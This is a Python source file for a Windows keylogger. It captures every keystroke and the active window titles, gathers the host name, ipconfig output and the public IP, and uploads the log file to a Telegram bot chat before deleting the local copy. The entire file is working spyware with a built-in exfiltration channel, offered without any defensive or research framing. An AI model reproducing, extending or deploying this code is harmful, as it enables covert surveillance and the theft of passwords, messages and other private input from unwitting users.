import time
import ctypes
import platform
import subprocess
import socket
import pygetwindow as gw
from pynput.keyboard import Listener
import keyboard
import telebot
import os

# Telegram bot token
TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'

# Chat ID where you want to send the messages
CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID'


# Initialize Telegram bot
bot = telebot.TeleBot(TOKEN)

# Initialize variables
current_app = None
current_window = None
current_app_line = ""
current_window_line = ""
date = None
caps_lock_on = None

def get_current_time():
    return time.strftime("%A, %B %d, %Y %H:%M:%S")

def get_public_ip():
    try:
        response = subprocess.check_output("curl ifconfig.me", shell=True)
        return response.decode("utf-8").strip()
    except Exception as e:
        return "Unable to retrieve public IP"

def create_system_info():
    global date
    date = time.strftime("%A, %B %d, %Y") + f"_{socket.gethostname()}.txt"
    computer_name = f"\nComputer Name: {socket.gethostname()}\n"
    os_info = f"OS: {platform.system()} {platform.release()}\n"
    ipconfig_info = f"\n{subprocess.getoutput('ipconfig')}\n"
    public_ip = f"\tPublic IP: {get_public_ip()}\n"
    system_info = f"Computer Information\n{computer_name}{os_info}{ipconfig_info}\n{public_ip}\n"
    with open(date, "a", encoding="utf-8") as f:
        f.write(system_info)
        f.write("[" + get_current_time() + "] : ")

def is_capslock_on():
    return ctypes.windll.user32.GetKeyState(0x14) & 1

def get_active_window_title():
    active_window = gw.getWindowsWithTitle(gw.getActiveWindow().title)
    return active_window[0].title if active_window else "Unknown Application"

def check_caps_lock():
    global caps_lock_on
    if keyboard.is_pressed('caps lock'):
        caps_lock_on = not caps_lock_on

def send_to_telegram(contents):
    # Send the contents to Telegram
    bot.send_document(CHAT_ID, open(date, 'rb'))
    # Remove the text file after sending
    os.remove(date)

def OnKeyboardEvent(event):
    global date, caps_lock_on, current_app, current_window, current_app_line, current_window_line
    check_caps_lock()
    event = str(event)
    event = event.replace("'", "")

    if event == "Key.enter":
        event = "\n"
        event = " {ENTER} "
        with open(date ,"a") as f:
            f.write(f"{event}\n")
            f.write("[" + get_current_time() + "] : ")

    elif event == "Key.space":
        event = " "
    
    elif event == "Key.alt":
        event = " {ALT} "
        
    elif event == "Key.alt_gr":
        event = " {ALT_GR} "
        
    elif event == "Key.alt_l":
        event = " {ALT_L} "
        
    elif event == "Key.alt_r":
        event = " {ALT_R} "
        
    elif event == "Key.backspace":
        event = " {BACKSPACE} "
        
    elif event == "Key.caps_lock":
        event = " {CAPS_LOCK} "
        
    elif event == "Key.cmd":
        event = " {CMD} "
        
    elif event == "Key.cmd_l":
        event = " {CMD_L} "
        
    elif event == "Key.cmd_r":
        event = " {CMD_R} "
        
    elif event == "Key.ctrl":
        event = " {CTRL} "
        
    elif event == "Key.ctrl_l":
        event = " {CTRL_L} "
        
    elif event == "Key.ctrl_r":
        event = " {CTRL_R} "
        
    elif event == "Key.delete":
        event = " {DELETE} "
        
    elif event == "Key.down":
        event = " {DOWN} "
        
    elif event == "Key.end":
        event = " {END} "
        
    elif event == "Key.esc":
        event = " {ESC} "
        
    elif event == "Key.home":
        event = " {HOME} "
        
    elif event == "Key.insert":
        event = " {INSERT} "
        
    elif event == "Key.left":
        event = " {LEFT} "
        
    elif event == "Key.media_next":
        event = " {MEDIA_NEXT} "
        
    elif event == "Key.media_play_pause":
        event = " {MEDIA_PLAY_PAUSE} "
        
    elif event == "Key.media_previous":
        event = " {MEDIA_PREVIOUS} "
        
    elif event == "Key.media_volume_down":
        event = " {MEDIA_VOLUME_DOWN} "
        
    elif event == "Key.media_volume_mute":
        event = " {MEDIA_VOLUME_MUTE} "
        
    elif event == "Key.media_volume_up":
        event = " {MEDIA_VOLUME_UP} "
        
    elif event == "Key.menu":
        event = " {MENU} "
        
    elif event == "Key.num_lock":
        event = " {NUM_LOCK} "
        
    elif event == "Key.page_down":
        event = " {PAGE_DOWN} "
        
    elif event == "Key.page_up":
        event = " {PAGE_UP} "
        
    elif event == "Key.pause":
        event = " {PAUSE} "
        
    elif event == "Key.print_screen":
        event = " {PRINT_SCREEN} "
        
    elif event == "Key.right":
        event = " {RIGHT} "
        
    elif event == "Key.scroll_lock":
        event = " {SCROLL_LOCK} "
        
    elif event == "Key.shift":
        event = " {SHIFT} "
        
    elif event == "Key.shift_l":
        event = " {SHIFT_L} "
        
    elif event == "Key.shift_r":
        event = " {SHIFT_R} "
        
    elif event == "Key.tab":
        event = " {TAB} "
        
    elif event == "Key.up":
        event = " {UP} "

    elif event == "Key.f1":
        event = " {F1} "

    elif event == "Key.f2":
        event = " {F2} "

    elif event == "Key.f3":
        event = " {F3} "

    elif event == "Key.f4":
        event = " {F4} "

    elif event == "Key.f5":
        event = " {F5} "

    elif event == "Key.f6":
        event = " {F6} "

    elif event == "Key.f7":
        event = " {F7} "
        
    elif event == "Key.f8":
        event = " {F8} "

    elif event == "Key.f9":
        event = " {F9} "

    elif event == "Key.f10":
        event = " {F10} "

    elif event == "Key.f11":
        event = " {F11} "

    elif event == "Key.f12":
        event = " {F12} "

    elif event.isalpha():
        if caps_lock_on:
            event = event.upper()
        else:
            event = event.lower()

    active_app = get_active_window_title()
    if current_app != active_app:
        current_app = active_app
        with open(date, "a", encoding="utf-8") as f:
            f.write(f"\n[{get_current_time()}] : [Application: {current_app}]")

    active_window = gw.getActiveWindow().title
    if current_window != active_window:
        current_window = active_window
        current_window_line = f"[Window/Tab: {current_window}]"

    with open(date, "a", encoding="utf-8") as f:
        f.write(event)

    # Send the file to Telegram every 10 seconds
    if int(time.time()) % 10 == 0:
        send_to_telegram(date)

# Create system information text file
create_system_info()

# Start listening to keyboard events
with Listener(on_press=OnKeyboardEvent) as listener:
    listener.join()
